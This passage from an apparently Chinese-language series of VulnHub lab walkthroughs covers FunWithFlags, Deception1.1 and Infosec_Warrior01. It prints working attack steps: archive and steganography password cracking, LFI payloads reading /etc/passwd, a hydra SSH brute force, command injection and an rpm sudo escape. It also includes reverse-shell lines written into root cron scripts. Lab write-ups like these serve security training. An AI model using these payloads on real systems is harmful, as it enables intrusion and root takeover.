http:&#x2F;&#x2F;192.168.1.105&#x2F;ftp.zip</span><br><span class="line">unzip ftp.zip</span><br></pre></td></tr></table></figure><p>收集信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ls -l var&#x2F;ftp&#x2F;pub&#x2F;howard</span><br><span class="line">total 36</span><br><span class="line">-rw-r--r-- 1 root root   273 Mar  3 17:05 note.txt</span><br><span class="line">-rw-r--r-- 1 root root 30762 Mar  5 19:29 super_secret_nasa_stuff_here.zip</span><br><span class="line"></span><br><span class="line">cat var&#x2F;ftp&#x2F;pub&#x2F;howard&#x2F;note.txt</span><br><span class="line">Please go away, nothing interesing here. I just had to temporary store some nasa data here</span><br><span class="line">because my laptop had a virus from some weird websites I visited ... anyway ...</span><br><span class="line">And don&#39;t bother looking at my secret data  I have encrypted them pretty well. I am an MIT  engineer!</span><br></pre></td></tr></table></figure><p>爆破压缩包</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">fcrackzip -D -p &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt -u super_secret_nasa_stuff_here.zip</span><br><span class="line">PASSWORD FOUND!!!!: pw &#x3D;&#x3D; astronaut</span><br><span class="line"></span><br><span class="line">unzip -P astronaut super_secret_nasa_stuff_here.zip</span><br><span class="line">Archive:  super_secret_nasa_stuff_here.zip</span><br><span class="line">  inflating: marsroversketch.jpg</span><br></pre></td></tr></table></figure><p>隐写爆破</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pip3 install stegcracker</span><br><span class="line"></span><br><span class="line">stegcracker var&#x2F;ftp&#x2F;pub&#x2F;howard&#x2F;marsroversketch.jpg &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt</span><br><span class="line">Successfully cracked file with password: iloveyoumom</span><br><span class="line">Tried 51349 passwords</span><br><span class="line">Your file has been written to: var&#x2F;ftp&#x2F;pub&#x2F;howard&#x2F;marsroversketch.jpg.out</span><br><span class="line"></span><br><span class="line">cat var&#x2F;ftp&#x2F;pub&#x2F;howard&#x2F;marsroversketch.jpg.out</span><br><span class="line">FLAG-howard&#123;b3d1baf22e07874bf744ad7947519bf4&#125;</span><br></pre></td></tr></table></figure><p><strong><code>FLAG-howard&#123;b3d1baf22e07874bf744ad7947519bf4&#125;</code></strong></p><ul><li>FLAG-leonard</li></ul><p>查看计划任务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;crontab</span><br><span class="line"></span><br><span class="line"># &#x2F;etc&#x2F;crontab: system-wide crontab</span><br><span class="line"># Unlike any other crontab you don&#39;t have to run the &#96;crontab&#39;</span><br><span class="line"># command to install the new version when you edit this file</span><br><span class="line"># and files in &#x2F;etc&#x2F;cron.d. These files also have username fields,</span><br><span class="line"># that none of the other crontabs do.</span><br><span class="line"></span><br><span class="line">SHELL&#x3D;&#x2F;bin&#x2F;sh</span><br><span class="line">PATH&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;sbin:&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin</span><br><span class="line"></span><br><span class="line"># m h dom mon dow usercommand</span><br><span class="line">17 ** * *root    cd &#x2F; &amp;&amp; run-parts --report &#x2F;etc&#x2F;cron.hourly</span><br><span class="line">25 6* * *roottest -x &#x2F;usr&#x2F;sbin&#x2F;anacron || ( cd &#x2F; &amp;&amp; run-parts --report &#x2F;etc&#x2F;cron.daily )</span><br><span class="line">47 6* * 7roottest -x &#x2F;usr&#x2F;sbin&#x2F;anacron || ( cd &#x2F; &amp;&amp; run-parts --report &#x2F;etc&#x2F;cron.weekly )</span><br><span class="line">52 61 * *roottest -x &#x2F;usr&#x2F;sbin&#x2F;anacron || ( cd &#x2F; &amp;&amp; run-parts --report &#x2F;etc&#x2F;cron.monthly )</span><br><span class="line">*&#x2F;1 ** * *root&#x2F;home&#x2F;leonard&#x2F;thermostat_set_temp.py</span><br><span class="line">#</span><br></pre></td></tr></table></figure><p>查看文件<code>/home/leonard/thermostat_set_temp.py</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ls -l &#x2F;home&#x2F;leonard</span><br><span class="line">total 4</span><br><span class="line">-rwxrwxrwx 1 root root 42 Mar 30 15:52 thermostat_set_temp.sh</span><br></pre></td></tr></table></figure><blockquote><p>计划任务里写的是<code>.py</code>，但这里是<code>.sh</code>?</p></blockquote><p>文件可写，可以写入反弹bash命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.1.3&#x2F;9990 0&gt;&amp;1&quot; &gt; &#x2F;home&#x2F;leonard&#x2F;thermostat_set_temp.sh</span><br></pre></td></tr></table></figure><p>本地监听9990端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 9990</span><br><span class="line">Ncat: Version 7.80 ( https:&#x2F;&#x2F;nmap.org&#x2F;ncat )</span><br><span class="line">Ncat: Listening on :::9990</span><br><span class="line">Ncat: Listening on 0.0.0.0:9990</span><br><span class="line">Ncat: Connection from 192.168.1.105.</span><br><span class="line">Ncat: Connection from 192.168.1.105:42922.</span><br><span class="line">bash: cannot set terminal process group (2108): Inappropriate ioctl for device</span><br><span class="line">bash: no job control in this shell</span><br><span class="line"></span><br><span class="line">id</span><br><span class="line">uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)</span><br></pre></td></tr></table></figure><p>查看flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat FLAG-leonard.txt</span><br><span class="line">FLAG-leonard&#123;17fc95224b65286941c54747704acd3e&#125;</span><br></pre></td></tr></table></figure><p><strong><code>FLAG-leonard&#123;17fc95224b65286941c54747704acd3e&#125;</code></strong></p><hr /><blockquote><p><code>/etc/crontab</code></p></blockquote><p>由于之前一直没有接触到计划任务的提权方法，在操作过程中便没有想到这一点<br />其原理大概与SUID差不多，低权用户以高权用户的身份执行命令</p><blockquote><p>grep高亮</p></blockquote><p>在grep节选flag时，出现了回显，便说明存在&quot;FLAG&quot;字样，但是由于字符太多、太密，难以寻找flag<br />个人操作时直接将文本拷贝至windows的notepad++中，然后Ctrl+F查找<br />后来想到grep可以高亮文本，加上参数<code>--color=auto</code>即可</p><blockquote><p>搜点</p></blockquote><p>或许用信息扫荡来描述这一行为更合适<br />当时个人状态不佳，没有仔细思考就用ftp客户端连上服务器，然后用<code>get</code>命令一个一个地下载文件<br />后来发现还是漏了一些比较重要的信息<br />或许在动手之前需要思考下，如何获取信息是最便捷的，有哪些地方需要搜查，否则可能会因为一次搜点的小疏漏而让工作量提升一半。</p><p>参考资料</p><blockquote><p><a href="https://www.hackingarticles.in/tbbt-funwithflags-vulnhub-walkthrough/">WP</a><br /><a href="https://www.cnblogs.com/markLogZhu/p/11398028.html">Mysql.Backup</a><br /><a href="https://www.cnblogs.com/hujiapeng/p/8470099.html">curl.Download</a><br /><a href="https://blog.csdn.net/u014236541/article/details/44516465">grep.highlight</a></p></blockquote><hr /><h1 id="deception11"><a class="markdownIt-Anchor" href="#deception11"></a> <a href="https://www.vulnhub.com/entry/haclabs-deception11,440/">Deception1.1</a></h1><p><code>2020/04/04 23:31:03</code></p><h2 id="端口扫描-15"><a class="markdownIt-Anchor" href="#端口扫描-15"></a> 端口扫描</h2><p><code>nmap -p 1-65535 -sV -A -T5 -v -n 192.168.31.110</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 192.168.31.110</span><br><span class="line">Host is up (0.00031s latency).</span><br><span class="line">Not shown: 65533 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22&#x2F;tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 75:b3:93:d4:f1:02:30:bf:35:ea:12:4e:3b:e7:fa:4a (RSA)</span><br><span class="line">|   256 f9:8c:43:5b:45:7d:fe:84:b1:f5:93:a3:68:bb:ce:84 (ECDSA)</span><br><span class="line">|_  256 77:2a:33:3e:8f:2b:65:a5:f3:df:b5:bc:58:4a:f4:8e (ED25519)</span><br><span class="line">80&#x2F;tcp open  http    Apache httpd 2.4.38 ((Debian))</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: POST OPTIONS HEAD GET</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.38 (Debian)</span><br><span class="line">|_http-title: Site doesn&#39;t have a title (text&#x2F;html).</span><br><span class="line">MAC Address: 08:00:27:4B:4E:6D (Oracle VirtualBox virtual NIC)</span><br><span class="line">Aggressive OS guesses: Linux 2.6.32 (96%), Linux 3.2 - 4.9 (96%), Netgear ReadyNAS 2100 (RAIDiator 4.2.24) (96%), Linux 2.6.32 - 3.10 (96%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Netgear ReadyNAS device (RAIDiator 4.2.21 - 4.2.27) (94%), Linux 2.6.32 - 2.6.35 (94%), Linux 2.6.32 - 3.5 (94%)</span><br><span class="line">No exact OS matches for host (test conditions non-ideal).</span><br><span class="line">Uptime guess: 22.680 days (since Thu Mar 12 19:47:39 2020)</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">TCP Sequence Prediction: Difficulty&#x3D;263 (Good luck!)</span><br><span class="line">IP ID Sequence Generation: All zeros</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br></pre></td></tr></table></figure><h2 id="web路径枚举-15"><a class="markdownIt-Anchor" href="#web路径枚举-15"></a> Web路径枚举</h2><p>尝试爆破80端口下的Web路径</p><p><code>dirb http://192.168.31.110/ -w</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">---- Scanning URL: http:&#x2F;&#x2F;192.168.31.110&#x2F; ----</span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.110&#x2F;index.html (CODE:200|SIZE:1315)                                      </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.110&#x2F;manual&#x2F;                                                 </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.110&#x2F;server-status (CODE:403|SIZE:279)</span><br></pre></td></tr></table></figure><h2 id="漏洞利用-15"><a class="markdownIt-Anchor" href="#漏洞利用-15"></a> 漏洞利用</h2><ul><li>访问<code>/</code></li></ul><p>该页面提供一个密码强度检测的功能<br />若密码中含有大写字母、小写字母、数字、特殊符号，且长度为8位及上，则会用alert弹出信息<br /><code>0000flagflagflagflag.php</code><br />而且页面内的内容为<br /><code>Password is strong , contains all 4 things(uppercase,lowercase,number,specialchars) with flag=1</code><br />这里的<code>with flag=1</code>就是个提示</p><p>尝试后发现存在php文件<code>/00001111.php</code><br />alter弹出信息为<code>find password.txt</code><br />页面内容为空白<br />源代码中存在注释信息<code>use ?page=</code><br />即可以使用get参数page</p><p>访问<code>/00001111.php?page=index.html</code><br />此时以页面为主页，则可判断page参数存在包含功能<br />有两种利用方式</p><ul><li>php伪协议进行LFI</li><li>file伪协议直接读取文件</li></ul><p>测试过程中两种方法均可使用，POC如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?page&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x2F;convert.base64-encode&#x2F;resource&#x3D;&#x2F;etc&#x2F;passwd</span><br><span class="line">?page&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure><p>尝试寻找password.txt<br />最后在找到路径为<code>/var/password.txt</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?page&#x3D;file:&#x2F;&#x2F;&#x2F;var&#x2F;password.txt</span><br><span class="line"></span><br><span class="line">I know the password for yash : ya5h** but I forgot the last 2 words. find them and use to connect to SSH </span><br></pre></td></tr></table></figure><p>构造字典如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">cat dic.py</span><br><span class="line"></span><br><span class="line">#!&#x2F;bin&#x2F;python2</span><br><span class="line"></span><br><span class="line">raw &#x3D; &#39;ya5h&#39;</span><br><span class="line">charset &#x3D; &#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#96;~!@#$%^&amp;*()_+-&#x3D;[]&#123;&#125;\|;:\&#39;&quot;,.&lt;&gt;&#x2F;?&#39;</span><br><span class="line"></span><br><span class="line">for i in charset:</span><br><span class="line">    for j in charset:</span><br><span class="line">        print raw + i + j</span><br></pre></td></tr></table></figure><p>使用hydra对于SSH服务进行爆破</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python dic.py &gt; pass</span><br><span class="line">hydra -I -l yash -P pass -V ssh:&#x2F;&#x2F;192.168.31.110</span><br><span class="line"></span><br><span class="line">[22][ssh] host: 192.168.31.110   login: yash   password: ya5hay</span><br></pre></td></tr></table></figure><p>得到账户yash</p><h2 id="权限提升-15"><a class="markdownIt-Anchor" href="#权限提升-15"></a> 权限提升</h2><p>登入服务器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh yash@192.168.31.110</span><br><span class="line">ya5hay</span><br></pre></td></tr></table></figure><p>查看计划任务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;crontab</span><br><span class="line"></span><br><span class="line"># &#x2F;etc&#x2F;crontab: system-wide crontab</span><br><span class="line"># Unlike any other crontab you don&#39;t have to run the &#96;crontab&#39;</span><br><span class="line"># command to install the new version when you edit this file</span><br><span class="line"># and files in &#x2F;etc&#x2F;cron.d. These files also have username fields,</span><br><span class="line"># that none of the other crontabs do.</span><br><span class="line"></span><br><span class="line">SHELL&#x3D;&#x2F;bin&#x2F;sh</span><br><span class="line">PATH&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;sbin:&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin</span><br><span class="line"></span><br><span class="line"># Example of job definition:</span><br><span class="line"># .---------------- minute (0 - 59)</span><br><span class="line"># |  .------------- hour (0 - 23)</span><br><span class="line"># |  |  .---------- day of month (1 - 31)</span><br><span class="line"># |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...</span><br><span class="line"># |  |  |  |  .---- day of week (0 - 6) (Sunday&#x3D;0 or 7) OR sun,mon,tue,wed,thu,fri,sat</span><br><span class="line"># |  |  |  |  |</span><br><span class="line"># *  *  *  *  * user-name command to be executed</span><br><span class="line">17 ** * *root    cd &#x2F; &amp;&amp; run-parts --report &#x2F;etc&#x2F;cron.hourly</span><br><span class="line">25 6* * *roottest -x &#x2F;usr&#x2F;sbin&#x2F;anacron || ( cd &#x2F; &amp;&amp; run-parts --report &#x2F;etc&#x2F;cron.daily )</span><br><span class="line">47 6* * 7roottest -x &#x2F;usr&#x2F;sbin&#x2F;anacron || ( cd &#x2F; &amp;&amp; run-parts --report &#x2F;etc&#x2F;cron.weekly )</span><br><span class="line">52 61 * *roottest -x &#x2F;usr&#x2F;sbin&#x2F;anacron || ( cd &#x2F; &amp;&amp; run-parts --report &#x2F;etc&#x2F;cron.monthly )</span><br><span class="line">#</span><br><span class="line">*&#x2F;1 * * * * &#x2F;home&#x2F;yash&#x2F;perm.sh</span><br></pre></td></tr></table></figure><p>查看文件<code>/home/yash/perm.sh</code>的权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ls -l &#x2F;home&#x2F;yash&#x2F;perm.sh </span><br><span class="line"></span><br><span class="line">-rwxrw-rw- 1 root root 29 Apr  5  2020 &#x2F;home&#x2F;yash&#x2F;perm.sh</span><br></pre></td></tr></table></figure><p>该文件可写，可以利用改文件进行计划任务提权</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#39;nc -e &#x2F;bin&#x2F;sh 192.168.31.10 9890&#39; &gt; perm.sh</span><br></pre></td></tr></table></figure><p>Kali上监听端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 9890</span><br><span class="line">id</span><br><span class="line"></span><br><span class="line">uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)</span><br></pre></td></tr></table></figure><hr /><p>参考资料</p><blockquote><p><a href="https://www.cnblogs.com/wh4am1/p/6542398.html">LFI</a></p></blockquote><hr /><h1 id="infosec_warrior01"><a class="markdownIt-Anchor" href="#infosec_warrior01"></a> <a href="https://www.vulnhub.com/entry/infosecwarrior-ctf-2020-01,446/">Infosec_Warrior01</a></h1><p><code>2020/04/12 11:41:51</code></p><h2 id="端口扫描-16"><a class="markdownIt-Anchor" href="#端口扫描-16"></a> 端口扫描</h2><p><code>nmap -p 1-65535 -sV -A -T5 -n -v 192.168.31.172</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 192.168.31.172</span><br><span class="line">Host is up (0.00054s latency).</span><br><span class="line">Not shown: 65533 filtered ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22&#x2F;tcp open  ssh     OpenSSH 5.3 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 2f:b3:a5:cd:e5:14:33:a1:82:3b:dd:5a:5e:d7:59:36 (DSA)</span><br><span class="line">|_  2048 2d:b4:15:28:36:d8:b5:4e:18:81:8e:af:3e:e4:de:c1 (RSA)</span><br><span class="line">80&#x2F;tcp open  http    Apache httpd 2.2.15 ((CentOS))</span><br><span class="line">| http-methods: </span><br><span class="line">|   Supported Methods: GET HEAD POST OPTIONS TRACE</span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-server-header: Apache&#x2F;2.2.15 (CentOS)</span><br><span class="line">|_http-title: Apache HTTP Server Test Page powered by CentOS</span><br><span class="line">MAC Address: 08:00:27:EC:26:4D (Oracle VirtualBox virtual NIC)</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 2.6.X|3.X</span><br><span class="line">OS CPE: cpe:&#x2F;o:linux:linux_kernel:2.6 cpe:&#x2F;o:linux:linux_kernel:3</span><br><span class="line">OS details: Linux 2.6.32 - 3.10, Linux 2.6.32 - 3.13</span><br><span class="line">Uptime guess: 0.001 days (since Sat Apr 11 23:43:10 2020)</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">TCP Sequence Prediction: Difficulty&#x3D;262 (Good luck!)</span><br><span class="line">IP ID Sequence Generation: All zeros</span><br></pre></td></tr></table></figure><h2 id="web路径枚举-16"><a class="markdownIt-Anchor" href="#web路径枚举-16"></a> Web路径枚举</h2><p><code>dirb http://192.168.31.172/ -w</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">---- Scanning URL: http:&#x2F;&#x2F;192.168.31.172&#x2F; ----</span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.172&#x2F;cgi-bin&#x2F; (CODE:403|SIZE:290)                                         </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.172&#x2F;sitemap.xml (CODE:200|SIZE:292)                                      </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.172&#x2F;wordpress&#x2F;</span><br></pre></td></tr></table></figure><ul><li>访问<code>http://192.168.31.172/wordpress/</code></li></ul><p>响应状态码为500，显示<code>Error establishing a database connection</code><br />Wordpress框架不可用</p><ul><li>访问<code>http://192.168.31.172/sitemap.xml</code></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;urlset&gt;</span><br><span class="line">&lt;url&gt;</span><br><span class="line">&lt;loc&gt;http:&#x2F;&#x2F;infosecwarrior.com&#x2F;index.htnl&lt;&#x2F;loc&gt;</span><br><span class="line">&lt;lastmod&gt;2020-02-13&lt;&#x2F;lastmod&gt;</span><br><span class="line">&lt;changefreq&gt;monthly&lt;&#x2F;changefreq&gt;</span><br><span class="line">&lt;priority&gt;0.8&lt;&#x2F;priority&gt;</span><br><span class="line">&lt;&#x2F;url&gt;</span><br><span class="line">&lt;&#x2F;urlset&gt;</span><br></pre></td></tr></table></figure><h2 id="漏洞利用-16"><a class="markdownIt-Anchor" href="#漏洞利用-16"></a> 漏洞利用</h2><p>访问<code>http://192.168.31.172/sitemap.xml</code>有一行内容<br /><code>&lt;loc&gt;http://infosecwarrior.com/index.htnl&lt;/loc&gt;</code></p><p>访问<code>http://192.168.31.172/index.htnl</code>成功</p><p>审计html代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action&#x3D;&quot;&#x2F;cmd.php&quot; method&#x3D;&quot;GET&quot; hidden&#x3D;&quot;True&quot;&gt;</span><br><span class="line"> command</span><br><span class="line">     &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;AI&quot; value&#x3D;&quot;&quot; maxlength&#x3D;&quot;100&quot;&gt;</span><br><span class="line"> &lt;br&gt;</span><br><span class="line"> &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;Submit&quot;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br></pre></td></tr></table></figure><p>删去<code>hidden=&quot;True&quot;</code><br />尝试进行命令执行，在表单中输入<code>ls</code><br />回显为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Now the main part what it is loooooool</span><br><span class="line">Try other method</span><br></pre></td></tr></table></figure><p>而且URL为<code>http://192.168.31.172/cmd.php?AI=ls</code></p><p>改为POST请求<br />执行成功</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">curl http:&#x2F;&#x2F;192.168.31.172&#x2F;cmd.php -d &quot;AI&#x3D;ls&quot;</span><br><span class="line"></span><br><span class="line">You Found ME : - (</span><br><span class="line"></span><br><span class="line">cmd.php</span><br><span class="line">hacker.gif</span><br><span class="line">index.htnl</span><br><span class="line">minnions.gif</span><br><span class="line">note.txt</span><br><span class="line">sitemap.xml</span><br><span class="line">wordpress</span><br></pre></td></tr></table></figure><p>即存在命令执行漏洞</p><p>查看cmd.php的内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">curl http:&#x2F;&#x2F;192.168.31.172&#x2F;cmd.php -d &quot;AI&#x3D;cat cmd.php&quot;</span><br><span class="line"></span><br><span class="line">$user&#x3D;&quot;isw0&quot;;</span><br><span class="line">$pass&#x3D;&quot;123456789blabla&quot;;</span><br></pre></td></tr></table></figure><p>获取到账户</p><h2 id="权限提升-16"><a class="markdownIt-Anchor" href="#权限提升-16"></a> 权限提升</h2><p>登入服务器的SSH服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh isw0@192.168.31.172</span><br><span class="line">123456789blabla</span><br></pre></td></tr></table></figure><p>查看sudo权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br><span class="line"></span><br><span class="line">User isw0 may run the following commands on this host:</span><br><span class="line">    (!root) NOPASSWD: &#x2F;bin&#x2F;bash</span><br><span class="line">    (root) &#x2F;bin&#x2F;ping, (root) &#x2F;bin&#x2F;ping6, (root) &#x2F;bin&#x2F;rpm, (root) &#x2F;bin&#x2F;ls, (root) &#x2F;bin&#x2F;mktemp</span><br></pre></td></tr></table></figure><p>使用root账户的rpm命令进行权限提升</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo -u root rpm --eval &#39;%&#123;lua:posix.exec(&quot;&#x2F;bin&#x2F;bash&quot;)&#125;&#39;</span><br><span class="line">id</span><br><span class="line"></span><br><span class="line">uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root) context&#x3D;unconfined_u:system_r:rpm_script_t:s0-s0:c0.c1023</span><br></pre></td></tr></table></figure><hr 